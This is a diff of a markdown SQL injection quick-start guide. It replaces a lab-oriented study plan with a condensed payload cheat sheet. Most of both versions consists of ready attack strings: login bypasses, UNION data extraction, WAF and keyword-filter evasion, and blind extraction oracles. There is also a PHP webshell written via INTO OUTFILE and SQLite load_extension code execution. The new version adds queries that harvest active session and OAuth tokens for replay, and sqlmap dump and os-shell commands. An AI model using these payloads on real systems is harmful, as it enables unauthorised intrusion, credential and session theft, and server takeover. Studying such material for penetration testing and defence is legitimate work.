@@ -1,544 +1,198 @@
-# SQL Injection Quick Start Guide
+# SQL Injection — Quick Start
 
-This is a quick reference companion to the comprehensive [sql-injection.md](./sql-injection.md) documentation.
+Quick-reference companion. For detailed scenarios see `injection-principles.md` and `INDEX.md`. Per-DBMS syntax and per-technique writeups are under `scenarios/sql/`.
 
-## Getting Started
+## Quickest probes
 
-### Setup
-1. Install Burp Suite Community Edition: https://portswigger.net/burp/communitydownload
-2. Configure browser proxy to 127.0.0.1:8080
-
-### Attack Progression Path
-
-**Beginners Start Here:**
-1. Lab 1: WHERE clause - Hidden data (Basic SQL injection)
-2. Lab 2: Login bypass (Authentication bypass)
-
-**Intermediate - UNION Attacks:**
-3. Lab 3: Column count determination
-4. Lab 4: Finding text columns
-5. Lab 5: Extracting data from other tables
-6. Lab 6: Multiple values in single column
-
-**Intermediate - Database Enumeration:**
-7. Lab 7: MySQL/MSSQL version query
-8. Lab 8: Oracle version query
-9. Lab 9: Non-Oracle database contents
-10. Lab 10: Oracle database contents
-
-**Advanced - Blind SQL Injection:**
-11. Lab 11: Boolean-based blind (conditional responses)
-12. Lab 12: Error-based blind (conditional errors)
-13. Lab 13: Visible error-based
-14. Lab 14: Time delays
-15. Lab 15: Time-based information extraction
-
-**Expert - Out-of-Band:**
-16. Lab 16: Out-of-band interaction (requires Burp Pro)
-17. Lab 17: Out-of-band data exfiltration (requires Burp Pro)
-
-**Advanced - WAF Bypass:**
-18. Lab 18: XML encoding bypass
-
-## Essential Burp Suite Shortcuts
-
-| Action | Windows/Linux | Mac |
-|--------|---------------|-----|
-| Send request | Ctrl+Space | Cmd+Space |
-| Switch tabs | Ctrl+Tab | Cmd+Tab |
-| URL encode | Ctrl+U | Cmd+U |
-| URL decode | Ctrl+Shift+U | Cmd+Shift+U |
-| Send to Repeater | Ctrl+R | Cmd+R |
-| Send to Intruder | Ctrl+I | Cmd+I |
-
-## Quick Payload Reference
-
-### Authentication Bypass
 ```sql
-admin'--
-admin' OR '1'='1'--
+'             "             \             ` 
+'+OR+1=1--    " OR "1"="1   ' OR 1=1#
+admin'--      admin'#       admin' OR '1'='1
+{"$ne":""}    {"$gt":""}    (NoSQL operator probes)
+```
+
+## Authentication bypass (top picks)
+
+```sql
+admin'--                       (most common — comments out password check)
+admin' OR '1'='1' --
 ' OR 1=1--
+') OR ('1'='1
+admin' UNION SELECT username,password FROM users--
 ```
 
-### WHERE Clause Filter Bypass (retrieve hidden/restricted data)
-When a parameter controls a filter (category, status, published, type):
+See `scenarios/sql/auth-bypass.md`.
+
+## WHERE filter bypass (retrieve hidden data)
+
 ```sql
-' OR '1'='1                   -- bypass all filters, return ALL rows
-' OR '1'='1' --               -- same with comment (safer)
-' OR 1=1 --                   -- numeric variant
-' UNION SELECT NULL,content,NULL FROM posts WHERE published=0 -- -- target unpublished
-```
-**Key insight:** `AND` has higher precedence than `OR` in SQL, so:
-`WHERE published=1 AND category='' OR '1'='1'` → returns ALL rows (the OR makes everything true)
-
-Test ALL GET/POST parameters — not just login forms. Category filters, search params, sort columns are common injection points.
-
-### Keyword Blocklist Bypass (Non-Recursive Replace)
-When the app removes SQL keywords using `str.replace()` / `str_replace()` (non-recursive), embed the keyword inside itself so removal produces it:
-```
-SESELECTLECT   → removes SELECT → SELECT
-UNUNIONION     → removes UNION  → UNION
-FRFROMOM       → removes FROM   → FROM
-OorR           → removes or     → OR
-AANDND         → removes AND    → AND
-WHWHEREERE     → removes WHERE  → WHERE
+' OR '1'='1                    (returns ALL rows, even with hidden filter)
+' OR 1=1 --                    (numeric variant)
+' UNION SELECT NULL,content,NULL FROM posts WHERE published=0 --
 ```
 
-**Full bypass payload:**
+`AND` binds tighter than `OR`: `WHERE published=1 AND category='' OR '1'='1'` returns all rows. Test ALL parameters — search, sort, lang, region, tag — not just login. See `scenarios/sql/where-clause-filter-bypass.md`.
+
+## Keyword blocklist bypass (non-recursive replace)
+
+When the app removes keywords with `str.replace()` once:
+
+```
+SESELECTLECT   → SELECT
+UNUNIONION     → UNION
+OorR           → OR
+AANDND         → AND
+WHWHEREERE     → WHERE
+```
+
+Full payload:
 ```sql
-' OorR '1'='1' --                                          -- OR blocklist bypass
-' UNUNIONION SESELECTLECT * FRFROMOM users WHWHEREERE 1=1 -- -- full UNION bypass
+' OorR '1'='1' --
+' UNUNIONION SESELECTLECT * FRFROMOM users WHWHEREERE 1=1 --
 ```
 
-**Key:** Read the source code first to determine the exact blocklist (which keywords, case-sensitive or not, processing order). The nesting pattern depends on which substring is removed — if both `OR` and `or` are blocked sequentially, use `OorR` (inner `or` removed first, leaving `OR` which was already processed).
+## Regex WAF bypass (whitespace-anchored)
 
-### Regex WAF Bypass (whitespace-anchored keyword matches)
-When a regex WAF blocks `union\s+select` (the most common pattern), parenthesizing the SELECT defeats it while staying valid SQL:
 ```sql
--- Regex `union\s+select` requires whitespace between the two keywords:
-union(select 1,2,3)              -- no whitespace; matches `union(`, not `union <ws>select`
-union(select(group_concat(table_name)) from information_schema.tables)
-union all(select 1,2,3)          -- ALL keyword between also bypasses
-union/**/select 1,2,3            -- comment as delimiter (covered above too)
-
--- Independent rule on the SAME WAF: `\bnull\b` blocked
--- Substitute placeholders with values that pass the column-type check:
-union(select 0,0,0)              -- numeric placeholder
-union(select '','','')           -- string placeholder
-union(select (0),(0),(0))        -- parenthesized
+union(select 1,2,3)              -- no whitespace between union and select
+union/**/select 1,2,3            -- comment as delimiter
+union all(select 1,2,3)
+union(select 0,0,0)              -- when null is also blocked
 ```
-**Test EACH WAF rule independently** before assuming SQLi is non-exploitable. WAFs commonly stack multiple regex rules: blocking `union select` AND `null` AND `information_schema` are three separate rules and each has a different bypass. Trip one rule per request, look at the error, then build the full payload from the bypasses that worked.
 
-### Blind SQLi Filter Bypass (Regex-Filtered Keywords)
-When the app uses `preg_match` or regex to block specific keywords (and, or, where, limit, like, substring, substr, etc.) and spaces:
+Test EACH WAF rule independently — `union select`, `null`, `information_schema` are usually 3 separate rules. See `scenarios/sql/waf-bypass.md`.
+
+## Blind SQLi filter bypass (regex-blocked keywords)
+
+When `preg_match` blocks `and|or|where|substring|substr` and spaces:
+
 ```sql
--- Space bypass: use SQL comments
-"/**/OR/**/1=1#                         -- /**/ replaces spaces everywhere
--- AND bypass: use && (MySQL alias for AND)
-"/**/&&/**/mid(password,1,1)="T         -- && replaces AND
--- substring/substr bypass: use mid() (MySQL equivalent)
-"/**/&&/**/mid(password,1,1)="T"#       -- mid(str,pos,len) = substring(str,pos,len)
--- Double-quote context: use " instead of ' when query uses double-quoted strings
-admin"/**/&&/**/1=1#                    -- double-quote injection
+"/**/OR/**/1=1#                            -- /**/ replaces spaces
+"/**/&&/**/mid(password,1,1)="T"#          -- && for AND, mid() for substring
+admin"/**/&&/**/length(password)>10#       -- length probe
+admin"/**/&&/**/mid(password,{pos},1)="{char}"#   -- char-by-char extract
 ```
 
-**Blind extraction workflow** (extract password → login):
-```
-1. Confirm injection: admin"/**/&&/**/1=1#  → "User exists"
-2. Extract password length: admin"/**/&&/**/length(password)>10#
-3. Extract char-by-char: admin"/**/&&/**/mid(password,{pos},1)="{char}"#
-4. Login with extracted credentials to get flag
-```
+MySQL `#` for comments (no trailing space). Check quote context — single vs double — by reading source. See `scenarios/sql/boolean-blind.md`.
 
-**Key:** Always check quote context (single vs double) by reading source code. MySQL uses `"` for string literals when `ANSI_QUOTES` is not set. Use `#` for MySQL comments (no trailing space needed, unlike `-- `).
+## SQLite blind via `ORDER BY ${var}`
 
-### SQLite Blind SQLi via `ORDER BY ${var}` — full extraction without UNION/stacked
-
-When source review finds raw template-literal interpolation into `ORDER BY` (e.g. Node.js `db.run(\`... ORDER BY ${col}\`)`), SQLite accepts arbitrary expressions in the sort key — including subqueries — so you get a per-request oracle that flips **row order** rather than overall truthiness.
-
-**Sink to look for during source review:**
-```js
-const q = `SELECT id, name, votes FROM emojis ORDER BY ${order}`;
-// TOOD: add parametrization  ← classic giveaway comment
-```
-
-**Oracle construction (the trap):** swapping between two columns whose values barely differ (e.g. `id` vs `name`) gives an unreliable signal. Choose **two columns with disparate value distributions** — `votes` vs `-votes` (or `count` vs `-count`) — so the predicate picks which side a known top row lands on:
+When source review finds raw template-literal interpolation into ORDER BY:
 
 ```sql
 -- Boolean oracle: predicate flips between ascending and descending sort
 CASE WHEN (<predicate>) THEN votes ELSE -votes END
 
--- Wrap a sqlite_master probe to leak schema/data:
+-- Schema/data leak via sqlite_master:
 CASE WHEN (SELECT substr(sql,N,1) FROM sqlite_master WHERE name='users')=char(C) THEN votes ELSE -votes END
 ```
 
-Compare the **first row of the response** between the two states; that one bit drives a binary search per character.
+Compare first row of response between the two states. ~7-10 requests/char via binary search.
 
-**Extraction recipe:**
-1. Schema discovery via `sqlite_master`: count rows, then leak `name` and `sql` per row.
-2. Per target column, binary-search each character: `unicode(substr(...,N,1)) < C` (32..126).
-3. Bound iteration with `length()` before reading characters.
+## SQLite load_extension RCE / INTO OUTFILE webshell
 
-**Why this is not brute force:** every probe is a deterministic boolean over DB state — a logical oracle, not a wordlist guess. ~7-10 requests per character via binary search.
-
-### SQLite load_extension() RCE (Django SQL Explorer / BI Tools)
-When a SQL-explorer-style admin UI hands your query to SQLite with `enable_load_extension=True`:
 ```sql
--- Upload a DLL/SO via any file-write primitive (Django admin banner field, static upload, etc.)
--- Windows (.dll): cross-compile from Linux/macOS:
---   x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -Wl,--export-all-symbols
--- DLL must export sqlite3_extension_init(db, errmsg, api) or sqlite3_<name>_init
--- Trigger (NOTE: pass path WITHOUT extension — SQLite appends .dll / .so):
-SELECT load_extension('C:\\path\\to\\payload');
-SELECT load_extension('/tmp/payload');
+-- SQLite (BI tools with enable_load_extension=True)
+SELECT load_extension('/tmp/payload');           -- linux .so
+SELECT load_extension('C:\\path\\to\\payload');   -- windows .dll (NO extension)
 
--- Runs as the DB process user (web/app service account).
--- If PowerShell blocked by GPO, have the DLL launch python.exe to run arbitrary scripts.
-```
-See `sql-injection-advanced.md` for full DLL source + chain details.
-
-### SQL Injection via Stored Procedure CONCAT + INTO OUTFILE (Webshell)
-When direct `SELECT INTO OUTFILE` is blocked but stored procedures allow string operations:
-```sql
--- Use CALL with CONCAT to build and execute dynamic queries:
-CALL sp_query(CONCAT('SELECT "<?php system($_GET[0]); ?>" INTO OUTFILE "/var/www/html/shell.php"'))
-
--- Or if semicolons are allowed in injection context:
+-- MySQL INTO OUTFILE (FILE priv + secure_file_priv empty)
 '; SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --
-
--- Requires FILE privilege and writable web directory
--- Check: SELECT @@secure_file_priv  (empty = unrestricted, NULL = disabled)
 ```
 
-### PHP filter_var URL Scheme Bypass
-When PHP `filter_var($url, FILTER_VALIDATE_URL)` is used as URL validation:
-```
-# 0:// scheme passes filter_var validation but behaves as relative path:
-0://evil.com;payload
+See `sql-injection-advanced.md` for DLL source + chain.
 
-# Use semicolon in hostname to inject additional content:
-0://host;127.0.0.1  ->  may resolve to localhost in some URL parsers
+## UNION column count
 
-# Combine with SQLi: if validated URL is used in a database query,
-# the semicolon + crafted path can carry SQL injection payload
-```
-
-### UNION Column Detection
 ```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
 ```
 
-### Data Extraction (2 columns)
+Continue until error disappears. See `scenarios/sql/union-based.md`.
+
+## Hash injection auth bypass (UNION + bcrypt/argon2)
+
+When login fetches a hash and compares via bcrypt:
+1. `' UNION SELECT 1 -- -` → "Invalid salt" confirms hash compare on query result.
+2. Generate hash you control: `python3 -c "import bcrypt; print(bcrypt.hashpw(b'test', bcrypt.gensalt()).decode())"`.
+3. Inject: `' UNION SELECT '$2b$12$YOUR_HASH' -- -` with password=`test`.
+
+## Skip password crack — steal active sessions
+
+When SQLi reads `users` with bcrypt hashes, check session tables FIRST:
+
 ```sql
-' UNION SELECT username,password FROM users--
-' UNION SELECT table_name,NULL FROM information_schema.tables--
+SELECT sessionid FROM sessions WHERE userid=1 AND status=0 ORDER BY lastaccess DESC LIMIT 1;   -- Zabbix
+SELECT session_key FROM django_session WHERE expire_date > NOW();                              -- Django
+SELECT id FROM oauth_access_tokens WHERE user_id=1 AND revoked=0;                              -- Laravel Passport
+SELECT token FROM personal_access_tokens WHERE tokenable_id=1;                                 -- Laravel Sanctum
 ```
 
-### Hash Injection Auth Bypass (UNION + bcrypt/argon2)
-When the login query fetches a password hash (single column) and compares via bcrypt/argon2:
-1. `' UNION SELECT 1 -- -` → "Invalid salt" error confirms hash comparison on query result
-2. Generate a hash you control: `python3 -c "import bcrypt; print(bcrypt.hashpw(b'test', bcrypt.gensalt()).decode())"`
-3. Inject it: `' UNION SELECT '$2b$12$YOUR_HASH' -- -` with password=`test`
-Works for any hash algorithm — just match the hash format the app expects.
+Replay as `Cookie: <name>=<token>`, `Authorization: Bearer <token>`, or `X-Auth-Token: <token>`.
 
-### Blind Boolean
+## Blind boolean
+
 ```sql
 ' AND 1=1--    (True - "Welcome back" appears)
-' AND 1=2--    (False - no "Welcome back")
+' AND 1=2--    (False)
 ' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
 ```
 
-### Time-Based (PostgreSQL)
+## Time-based (PostgreSQL)
+
 ```sql
 '; SELECT pg_sleep(10)--
 '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 ```
 
-## Database-Specific Syntax Cheat Sheet
+## LIKE-based blind (when substr/mid fail)
 
-### Comments
-| Database | Syntax |
-|----------|--------|
-| MySQL | `#` or `-- ` (space required) |
-| PostgreSQL | `--` |
-| MSSQL | `--` |
-| Oracle | `--` |
-
-### String Concatenation
-| Database | Syntax | Example |
-|----------|--------|---------|
-| MySQL | `CONCAT()` or space | `CONCAT('a','b')` or `'a' 'b'` |
-| PostgreSQL | `\|\|` | `'a'\|\|'b'` |
-| MSSQL | `+` | `'a'+'b'` |
-| Oracle | `\|\|` | `'a'\|\|'b'` |
-
-### Time Delays
-| Database | Function | Example |
-|----------|----------|---------|
-| MySQL | `SLEEP()` | `SELECT SLEEP(10)` |
-| PostgreSQL | `pg_sleep()` | `SELECT pg_sleep(10)` |
-| MSSQL | `WAITFOR DELAY` | `WAITFOR DELAY '0:0:10'` |
-| Oracle | `dbms_pipe.receive_message()` | `dbms_pipe.receive_message('a',10)` |
-
-### Version Detection
-| Database | Query |
-|----------|-------|
-| MySQL | `SELECT @@version` or `SELECT version()` |
-| PostgreSQL | `SELECT version()` |
-| MSSQL | `SELECT @@version` |
-| Oracle | `SELECT banner FROM v$version` |
-
-## Common Mistakes to Avoid
-
-### Lab 1-2 (Basics)
-❌ Forgetting SQL comment syntax (`--`)
-❌ Not URL-encoding properly
-✅ Use `'+OR+1=1--` format
-
-### Lab 3-6 (UNION Attacks)
-❌ Not matching column count exactly
-❌ Testing all columns at once instead of one by one
-✅ Use NULL for unknown data types
-✅ Test string columns individually
-
-### LIKE-Based Blind Extraction (when substr/mid fail)
-When `substr()` and `mid()` are non-functional (CMS-specific SQL context, nested queries):
 ```sql
--- Incremental hex LIKE pattern: build value char-by-char
-AND (SELECT column FROM table LIMIT 0,1) LIKE 0x61%    -- starts with 'a'?
-AND (SELECT column FROM table LIMIT 0,1) LIKE 0x6162%  -- starts with 'ab'?
--- Iterate: for each position, try 0x00-0xff appended to known prefix
--- Use time-based wrapper: CASE WHEN (col LIKE 0xprefix%) THEN sleep(3) ELSE 0 END
-```
-Key: hex LIKE patterns avoid quote escaping issues and work in most MySQL contexts.
-
-### Lab 11-15 (Blind SQLi)
-❌ Not configuring Burp Intruder's Grep Match
-❌ Using multi-threaded resource pools for time-based attacks
-✅ Set resource pool max concurrent requests = 1 for time-based
-✅ Monitor "Response received" column, not "Response completed"
-
-### Lab 16-17 (Out-of-Band)
-❌ Forgetting to replace BURP-COLLABORATOR-SUBDOMAIN
-❌ Not checking Collaborator tab for interactions
-✅ Use Burp Pro (required for Collaborator)
-✅ Check both DNS and HTTP interactions
-
-## Burp Intruder Configuration for Blind SQLi
-
-### Boolean-Based (Lab 11)
-1. Send request to Intruder
-2. Add payload position: `§a§` around test character
-3. Payload type: Simple list
-4. Add payloads: a-z and 0-9
-5. Options → Grep - Match → Add "Welcome back"
-6. Start attack
-7. Look for checked responses
-
-### Time-Based (Lab 15)
-1. Resource Pool → Create new pool
-2. Set "Maximum concurrent requests" = 1 ⚠️ CRITICAL
-3. Add payload position: `§a§`
-4. Payload type: Simple list
-5. Add payloads: a-z and 0-9
-6. Start attack
-7. Sort by "Response received" column
-8. Look for ~10,000ms delays (vs ~100-500ms normal)
-
-## Database Enumeration Roadmap
-
-```
-1. Identify Database Type
-   ├─ Test version query syntax
-   ├─ Observe error messages
-   └─ Test time delay functions
-
-2. Enumerate Tables
-   ├─ MySQL/PostgreSQL: information_schema.tables
-   └─ Oracle: all_tables
-
-3. Enumerate Columns
-   ├─ MySQL/PostgreSQL: information_schema.columns
-   └─ Oracle: all_tab_columns
-
-4. Extract Data
-   └─ SELECT column_name FROM table_name
+AND (SELECT column FROM table LIMIT 0,1) LIKE 0x61%      -- starts with 'a'?
+AND (SELECT column FROM table LIMIT 0,1) LIKE 0x6162%    -- starts with 'ab'?
+-- Time-based wrapper:
+AND IF((SELECT column FROM table LIMIT 0,1) LIKE 0x61%, sleep(3), 0)
 ```
 
-## When to Use Each Technique
+Hex LIKE patterns avoid quote escaping issues.
 
-### Use UNION-based when:
-✅ Query results visible in application response
-✅ You can match column count and data types
-✅ No WAF blocking UNION keyword
+## Per-DBMS quick syntax
 
-### Use Boolean blind when:
-✅ Application shows different responses for true/false
-✅ "Welcome back" or similar conditional message
-✅ Can't see query results directly
+| | MySQL | PostgreSQL | MSSQL | Oracle |
+|---|---|---|---|---|
+| Comment | `#` or `-- ` | `--` | `--` | `--` |
+| Concat | `CONCAT()`/space | `\|\|` | `+` | `\|\|` |
+| Sleep | `SLEEP(N)` | `pg_sleep(N)` | `WAITFOR DELAY '0:0:N'` | `dbms_pipe.receive_message('a',N)` |
+| Version | `@@version` | `version()` | `@@version` | `BANNER FROM v$version` |
+| Substring | `SUBSTRING(s,p,l)` | `SUBSTRING(s,p,l)` | `SUBSTRING(s,p,l)` | `SUBSTR(s,p,l)` |
 
-### Use Time-based blind when:
-✅ No visible response differences
-✅ Application doesn't show different content
-✅ Last resort when other techniques fail
+See `scenarios/sql/per-dbms-{mysql,postgres,mssql,oracle}.md`.
 
-### Use Error-based when:
-✅ Database errors displayed to user
-✅ Error messages contain query data
-✅ Type casting errors reveal information
+## Burp Intruder for blind SQLi
 
-### Use Out-of-band when:
-✅ Have Burp Suite Professional
-✅ Asynchronous query execution
-✅ All other techniques blocked or unreliable
+**Boolean:** `§a§` payload position, simple list a-z/0-9, Grep Match "Welcome back".
 
-## Essential Tools Installation
+**Time-based (CRITICAL):** Resource Pool → New pool → Max concurrent = 1. Sort by "Response received" column. ~10,000ms = match.
 
-### Burp Suite Community Edition
+## Common gotchas / when to use what
+
+- MySQL `--` needs trailing space; use `#`. Oracle needs `FROM dual` for literals. Time-based = single-thread only. WAFs use libinjection. `secure_file_priv` blocks INTO OUTFILE. Stacked queries: MSSQL/PG yes, MySQL/Oracle no.
+- **UNION** for visible results; **Boolean blind** for true/false response diff; **Time-based** for no diff/no errors; **Error-based** for verbose errors; **OOB** for async / when else fails.
+
+## sqlmap quick wins
+
 ```bash
-# Download from: https://portswigger.net/burp/communitydownload
-# Windows/Mac: Run installer
-# Linux:
-chmod +x burpsuite_community_linux.sh
-./burpsuite_community_linux.sh
+sqlmap -u "http://target/?id=1" --batch
+sqlmap -u "http://target/?id=1" --dbs
+sqlmap -u "http://target/?id=1" -D dbname -T users --dump
+sqlmap -u "http://target/?id=1" --tamper=space2comment
+sqlmap -u "http://target/?id=1" --os-shell
+sqlmap -r request.txt --batch
 ```
-
-### sqlmap
-```bash
-# Kali Linux (pre-installed):
-sqlmap -h
-
-# Other Linux:
-git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
-cd sqlmap
-python3 sqlmap.py -h
-
-# Using pip:
-pip3 install sqlmap
-```
-
-### Hackvertor (Burp Extension for Lab 18)
-1. Burp Suite → Extender → BApp Store
-2. Search "Hackvertor"
-3. Click "Install"
-4. Usage: Highlight payload → Right-click → Extensions → Hackvertor → Encode → hex_entities
-
-## Study Plan
-
-### Week 1: Foundations
-- Day 1-2: Labs 1-2 (Basic injection + auth bypass)
-- Day 3-4: Labs 3-4 (UNION column enumeration)
-- Day 5-6: Labs 5-6 (UNION data extraction)
-- Day 7: Review and practice
-
-### Week 2: Database Enumeration
-- Day 1-2: Labs 7-8 (Version queries)
-- Day 3-4: Labs 9-10 (Database contents)
-- Day 5-7: Practice and review all UNION techniques
-
-### Week 3: Blind SQL Injection
-- Day 1-2: Lab 11 (Boolean blind)
-- Day 3-4: Lab 12-13 (Error-based)
-- Day 5-6: Lab 14-15 (Time-based)
-- Day 7: Review blind techniques
-
-### Week 4: Advanced Topics
-- Day 1-2: Labs 16-17 (Out-of-band) - requires Burp Pro
-- Day 3-4: Lab 18 (WAF bypass)
-- Day 5-7: Review all labs, automation with sqlmap
-
-## Troubleshooting
-
-### Issue: Burp Proxy not intercepting
-**Solution:**
-1. Check Burp Proxy → Intercept is on
-2. Verify proxy settings: 127.0.0.1:8080
-3. Import Burp CA certificate in browser
-
-### Issue: Lab not solving after correct payload
-**Solution:**
-1. Check for trailing spaces in payload
-2. Verify exact payload format from solution
-3. Ensure proper URL encoding
-4. Check if using correct database syntax
-
-### Issue: Burp Intruder not detecting password
-**Solution:**
-1. Verify Grep Match configured correctly
-2. For time-based: Check resource pool = 1
-3. Monitor correct column ("Response received" for time-based)
-4. Ensure payload list includes correct characters
-
-### Issue: Out-of-band labs not working
-**Solution:**
-1. Confirm using Burp Suite Professional
-2. Check Burp Collaborator is polling
-3. Verify replaced BURP-COLLABORATOR-SUBDOMAIN
-4. Wait 30-60 seconds for interactions
-
-## Next Steps After Completing Labs
-
-1. **Practice on Other Platforms:**
-   - HackTheBox (https://hackthebox.com)
-   - TryHackMe (https://tryhackme.com)
-   - PentesterLab (https://pentesterlab.com)
-
-2. **Learn Automation:**
-   - Master sqlmap usage
-   - Write custom Python scripts
-   - Create Burp extensions
-
-3. **Study Real CVEs:**
-   - Research disclosed SQL injection vulnerabilities
-   - Read bug bounty reports
-   - Analyze patch diffs
-
-4. **Certifications:**
-   - eWPT (Web Application Penetration Tester)
-   - OSWE (Offensive Security Web Expert)
-   - CEH (Certified Ethical Hacker)
-   - OSCP (includes web app testing)
-
-5. **Responsible Disclosure:**
-   - Join bug bounty platforms (HackerOne, Bugcrowd)
-   - Practice responsible disclosure
-   - Build professional portfolio
 
 ## Resources
 
-### Official Documentation
-- **Full SQL Injection Guide**: [sql-injection.md](./sql-injection.md)
-- **SQL Injection Cheat Sheet**: https://portswigger.net/web-security/sql-injection/cheat-sheet
-
-### Video Walkthroughs
-- **Rana Khalil**: YouTube channel with SQL injection walkthroughs
-- **The Cyber Mentor**: SQL injection fundamentals
-
-### Books
-- "The Web Application Hacker's Handbook" by Stuttard & Pinto
-- "SQL Injection Attacks and Defense" by Justin Clarke
-
-### Practice More
-- **DVWA**: Damn Vulnerable Web Application
-- **SQLi Labs**: 75+ SQL injection challenges
-- **WebGoat**: OWASP educational platform
-
-## Quick Reference Card
-
-**Most Common Payload (Copy-Paste Ready):**
-```
-' UNION SELECT NULL,username||':'||password FROM users--
-```
-
-**Most Common Burp Intruder Setup:**
-1. Payload: `§a§`
-2. Simple list: a-z, 0-9
-3. Grep Match: Success indicator
-4. Resource Pool: 1 (for time-based only)
-
-**Database Detection Fast:**
-```sql
-# Oracle (requires FROM)
-' UNION SELECT NULL FROM dual--
-
-# MySQL (# comment)
-' UNION SELECT NULL#
-
-# PostgreSQL/MSSQL
-' UNION SELECT NULL--
-```
-
-**Emergency Escape Sequence:**
-If you break a lab, click "Access the lab" again to reset.
-
----
-
-**Ready to Start?**
-1. Open [sql-injection.md](./sql-injection.md) for detailed technique reference
-2. Begin with the WHERE clause filter bypass scenario
-3. Progress through UNION attacks, then blind injection techniques
-
-**Good luck and happy (ethical) hacking! 🛡️**
-
+- `injection-principles.md`, `INDEX.md`.
+- PortSwigger SQLi cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
